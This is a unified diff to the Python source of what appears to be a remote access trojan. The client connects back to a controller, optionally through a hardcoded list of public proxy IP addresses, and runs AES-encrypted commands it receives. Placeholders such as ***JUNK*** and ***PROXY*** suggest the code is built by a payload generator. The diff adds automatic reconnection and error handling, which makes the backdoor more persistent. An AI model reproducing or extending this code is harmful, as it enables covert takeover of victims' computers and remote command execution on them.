@@ -18,6 +18,35 @@
 # 	win32gui.DeleteObject(saveBitMap.GetHandle())
 # 	return bmpname
 
+def fconnect():
+	global s, success, pconnect
+	pconnect = False
+	if useproxy:
+		while not pconnect:
+			for proxy in proxies:
+				try:
+					s = socks.socksocket()
+					s.setproxy(socks.HTTP,proxy[0],proxy[1])
+					s.settimeout(20)
+					s.connect((host, port))
+					success = "GET / HTTP/1.1**r**n**r**n" + success
+					pconnect = True
+					break
+				except:
+					pass
+
+	else:
+		while not pconnect:
+			try:
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+				s.settimeout(20)
+				s.connect((host, port))
+				pconnect = True
+			except:
+				pass
+	s.send(success)
+	s.settimeout(999)
+
 def Wget(file):
 	down = urllib2.urlopen(file)
 	filename = file.split('/')[-1]
@@ -149,7 +178,7 @@ EncodeAES = lambda c, s: ***B64E***(c.encrypt(s))
 DecodeAES = lambda c, e: c.decrypt(***B64D***(e))
 iv = Random.new().read(***AES***.block_size)
 cipher = ***AES***.new(secret,***AES***.MODE_CFB, iv)
-MeterBin, DropSock, pconnect = None, None, False
+MeterBin, DropSock = None, None
 isAdmin, isSystem, is64, isWindows, ushell = False, False, False, False, False
 pwd = os.getcwd()
 opsys = platform.uname()[0] + ' ' + platform.uname()[2]
@@ -249,38 +278,31 @@ proxies = [["37.187.58.37", 3128], ["188.40.252.215", 7808], ["65.49.14.147", 30
 	#################################################################################################################
 
 ***PROXY***
-if useproxy:
-	while not pconnect:
-		for proxy in proxies:
-			try:
-				s = socks.socksocket()
-				s.setproxy(socks.HTTP,proxy[0],proxy[1])
-				s.settimeout(20)
-				s.connect((host, port))
-				success = "GET / HTTP/1.1**r**n**r**n" + success
-				pconnect = True
-				break
-			except:
-				pass
 
-else:
-	while not pconnect:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.settimeout(20)
-			s.connect((host, port))
-			pconnect = True
-		except:
-			pass
 
-s.send(success)
+fconnect()
 
 while True:
-	data = s.recv(2048)
-	decrypted = DecodeAES(cipher, data)
+	try:
+		data = s.recv(2048)
+		decrypted = DecodeAES(cipher, data)
+	except:
+		fconnect()
+		decrypted = 'donaught'
+
+	for char in decrypted:
+		if char not in string.printable:
+			encrypted = EncodeAES(cipher, starpadding * 3 + '^^')
+			s.send(encrypted)
+			decrypted = 'donaught'
+			break
+
 	if decrypted == "quit" or decrypted == "exit":
 		s.close()
-		break
+		exit()
+
+	elif decrypted == 'donaught':
+		pass
 
 	# elif decrypted.startswith('screenshot'):
 	# 	upfile = fscreenshot()
@@ -436,7 +458,10 @@ while True:
 		except:
 			pass
 		result = '**n'.join(stdout.split('**n')[:-1])
-		sendAES(result)
+		try:
+			sendAES(result)
+		except:
+			fconnect()
 
 s.close()
 ***JUNK***
